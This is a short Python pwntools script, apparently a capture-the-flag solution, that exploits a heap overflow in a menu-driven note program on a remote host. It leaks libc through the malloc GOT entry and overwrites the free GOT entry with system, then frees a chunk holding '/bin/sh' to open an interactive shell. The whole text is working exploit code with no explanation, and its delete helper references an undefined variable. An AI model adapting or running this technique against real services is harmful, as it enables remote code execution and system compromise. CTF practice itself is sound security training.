from pwn import *

context.log_level = "debug"

def add(title, name, size, content):
	p.recvuntil("Input your choice:")
	p.sendline("1")
	p.recvuntil("title:\n")
	p.send(title)
	p.recvuntil("name:\n")
	p.send(name)
	p.recvuntil("message size:\n")
	p.sendline(str(size))
	p.recvuntil("message:\n")
	p.send(content)


def edit(index, size, content):
	p.recvuntil("Input your choice:")
	p.sendline("2")
	p.recvuntil("Which one?\n")
	p.sendline(str(index))
	p.recvuntil("message size:\n")
	p.sendline(str(size))
	p.recvuntil("new message:\n")
	p.send(content)

def show(index):
	p.recvuntil("Input your choice:")
	p.sendline("3")
	p.recvuntil("Which one?\n")
	p.sendline(str(index))
	p.recvuntil("Content: ")
	addr = u64(p.recv(6).ljust(8, "\x00"))
	return addr

def delete():
	p.recvuntil("Input your choice:")
	p.sendline("4")
	p.recvuntil("Which one?\n")
	p.sendline(str(index))

malloc_got = 0x602050
free_got = 0x0602018
malloc_so = 0x084130
system_so = 0x45390	
#p = process("./pwn2")
p = remote("192.168.30.23",20002)

add("0","00",0xbf,"000")
edit(0,0x8f,"0000")
add("1","11",0x30,"111")
edit(0, 0x8f,"a"*0x90 + p64(0x0) + p64(0x31) + "b"*0x18 + p64(malloc_got)[0:7])
malloc = show(1)
libc = malloc - malloc_so
system = libc + system_so
edit(0, 0x8f,"/bin/sh\x00" + "a"*0x88 + p64(0x0) + p64(0x31) + "b"*0x18 + p64(free_got)[0:7])
edit(1,0x30,p64(system))
p.sendline("4")
p.sendline("0")
p.interactive()